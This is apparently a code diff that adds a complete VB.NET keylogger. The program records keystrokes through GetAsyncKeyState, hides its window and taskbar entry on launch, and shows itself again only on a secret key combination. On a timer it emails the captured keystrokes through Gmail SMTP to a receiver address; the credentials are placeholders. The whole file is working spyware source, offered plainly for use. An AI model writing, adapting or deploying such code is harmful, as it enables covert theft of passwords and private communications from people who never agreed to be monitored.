@@ -1,0 +1,66 @@
+Option Strict On
+Imports System.Net.Mail
+
+Public Class Form1
+    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Long) As Short
+    Private Sub tmrEmail_Tick(sender As Object, e As EventArgs) Handles tmrEmail.Tick
+        Try
+            Dim smtpserver As New SmtpClient
+            smtpserver.EnableSsl = True
+            smtpserver.Credentials = New Net.NetworkCredential("email", "password")
+            smtpserver.Port = 587
+            smtpserver.Host = "smtp.gmail.com"
+            'Configuring our email message
+            Dim mail As New MailMessage
+            mail = New MailMessage
+            mail.From = New MailAddress("sender email", "sender display name")
+            mail.To.Add("receiver email")
+            mail.Subject = ("New Key Log Data")
+            mail.Body = txtLogs.Text
+            smtpserver.Send(mail)
+
+        Catch ex As Exception
+            Me.Close()
+        End Try
+    End Sub
+
+    Private Sub tmrKey_Tick(sender As Object, e As EventArgs) Handles tmrKey.Tick
+        Dim result As Integer
+        Dim key As String
+        Dim i As Integer
+        'For statement to get our keystrokes
+        For i = 2 To 90
+            result = 0
+            result = GetAsyncKeyState(i)
+
+            If result = -32767 Then
+                key = Chr(i)
+                If i = 13 Then key = vbNewLine
+                Exit For
+            End If
+        Next i
+        'Determining if the user is typing in upper or lower case font
+        If key <> Nothing Then
+            If My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
+                txtLogs.Text &= key
+            Else
+                txtLogs.Text &= key.ToLower
+            End If
+        End If
+        'How the user can set the visibiity of the program to true
+        If My.Computer.Keyboard.AltKeyDown AndAlso My.Computer.Keyboard.CtrlKeyDown AndAlso key = "V" Then
+            Me.Visible = True
+        End If
+    End Sub
+
+    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
+        txtLogs.Text &= vbNewLine & "Keylogger has been stopped at: " & Now & vbNewLine
+    End Sub
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
+        Me.ShowIcon = False
+        Me.ShowInTaskbar = False
+        Me.Visible = False
+        txtLogs.Text &= vbNewLine & "Keylogger started at: " & Now & vbNewLine
+    End Sub
+End Class
